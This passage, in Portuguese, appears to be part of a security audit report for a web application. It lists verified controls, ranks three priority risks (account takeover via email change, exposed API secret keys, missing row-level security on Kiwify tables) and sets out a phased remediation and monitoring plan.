| Credenciais — AES-256-GCM + HKDF-SHA256 + salt por instalação | ✅ Correto |
| path-to-regexp ReDoS (HIGH) | ✅ Corrigido em sessão anterior |
| Prototype pollution em `parseCookieJson` (MeLi) | ✅ Corrigido em sessão anterior |
| SSRF em `resolveRouteLinkWithRedirect` | ✅ Corrigido em sessão anterior |
| Template preview XSS — `escapeHtml()` antes de HTML tags | ✅ Correto |
| `normalizeSafeMediaMime()` em uploads de imagem | ✅ Correto |
| Domínio MeLi em `session.ts` — allowlist exata | ✅ Correto |
| `user_roles` e `profiles` — triggers de imutabilidade | ✅ Correto |
| Todos os microserviços — `no-new-privileges: true` no compose | ✅ Correto |
| Expose vs ports: no docker-compose — serviços não expostos ao host | ✅ Correto |
| Idempotência do webhook Kiwify | ✅ Correto |

---

## Top 3 Riscos — Remediação Imediata

### #1 — Cadeia de Account Takeover (H-4 + M-1 + M-2)
**Contexto:** Cookie roubado → troca silent de e-mail → reset de senha → conta completamente tomada.  
**Ação:** Exigir `current_password` na troca de e-mail, definir `token_invalidated_before = NOW()`, enviar verificação para novo e-mail.  
**Esforço:** ~30 linhas em `auth.ts`. Zero risco de regressão.

### #2 — `secret_key` exposta em toda mutação de `api_credentials` (H-5)
**Contexto:** UPDATE trivial (mudar nome) retorna chave API de terceiro em plaintext.  
**Ação:** Adicionar `maskSensitiveColumns()` após cada `decryptRows()` em INSERT, UPDATE, UPSERT, DELETE em `rest.ts`.  
**Esforço:** 3 linhas de código.

### #3 — Tabelas Kiwify sem RLS (H-2)
**Contexto:** Qualquer usuário autenticado pode ler `kiwify_config` (creds OAuth), `kiwify_transactions` (PII clientes), `kiwify_webhooks_log`.  
**Ação:** Migration SQL de ~30 linhas com `ENABLE ROW LEVEL SECURITY` e policies para as 4 tabelas.  
**Esforço:** Nova migration SQL. Zero risco de regressão na API (que não usa PostgREST diretamente para essas tabelas).

---

## Plano de Remediação por Fases

### Fase 1 — Imediato (hoje)
| # | Item | Arquivo | Risco sem correção |
|---|---|---|---|
| 1 | Email change: exigir `current_password` + invalidar sessões | auth.ts | Account takeover |
| 2 | `maskSensitiveColumns` em INSERT/UPDATE/UPSERT | rest.ts | secret_key exposta |
| 3 | RLS + policies para tabelas Kiwify | nova migration SQL | Dump de PII e creds |
| 4 | Webhook Kiwify: remover lookup de `req.query["token"]` | index.ts | Token de webhook em logs |

### Fase 2 — Curto prazo (esta semana)
| # | Item | Arquivo |
|---|---|---|
| 5 | `isMercadoLivreUrl`: substituir includes por allowlist | mercadolivre-rpa/server.ts |
| 6 | Validação de protocolo em `redirectUrl` (MasterGroup + LinkHub) | MasterGroupPublicPage.tsx, LinkHubPublicPage.tsx |
| 7 | `BACKUP_ENCRYPTION_KEY`: falhar se vazio | sessions-backup-entrypoint.sh |
| 8 | `DB_SSL_REJECT_UNAUTHORIZED`: padrão `true` | docker-compose.coolify.yml |
| 9 | `maskSensitiveColumns` em DELETE com RETURNING | rest.ts |
| 10 | Validação de protocolo em `kiwifyCheckoutUrl` e `affiliateLink` | Configuracoes.tsx, ProductCard.tsx |

### Fase 3 — Estrutural (próximas 2 semanas)
| # | Item |
|---|---|
| 11 | Token de impersonação: mover para redirect server-side (sem token na URL) |
| 12 | `CREDENTIAL_CIPHER_SALT` como env var (remover fallback de arquivo) |
| 13 | Errros PostgreSQL: capturar `pg.DatabaseError`, retornar mensagens genéricas |
| 14 | Rate limiters: fail-closed para endpoints de auth em caso de falha do store |
| 15 | Política de senha: aumentar mínimo para 12 chars + verificação de breach |
| 16 | `logAudit()` em falhas de login |
| 17 | Containers meli + sessions-backup: adicionar `USER` não-root |
| 18 | Limpar PII em audit logs de signup |
| 19 | Cooldown por e-mail para envio de verification/reset |
| 20 | JWT changeme: bloquear via `ALLOW_INSECURE_DEFAULTS` guard |

---

## Risco Residual e Monitoramento

Após todas as correções acima aplicadas, o risco residual principal será:
1. **Disponibilidade do ops-control** como último controle de orquestração — monitorar acessos não autorizados
2. **Rotação periódica de segredos** — `JWT_SECRET`, `KIWIFY_WEBHOOK_SECRET`, `OPS_CONTROL_TOKEN` devem ser rotacionados a cada 90 dias
3. **Monitoramento de `admin_audit_logs`** — alertar em picos de `session.failed` por conta ou IP

**Dependências com CVE conhecida:** nenhuma detectada no estado atual do `npm audit` (confirmado em sessão anterior de 2026-04-06). Manter verificação semanal automatizada no pipeline CI.
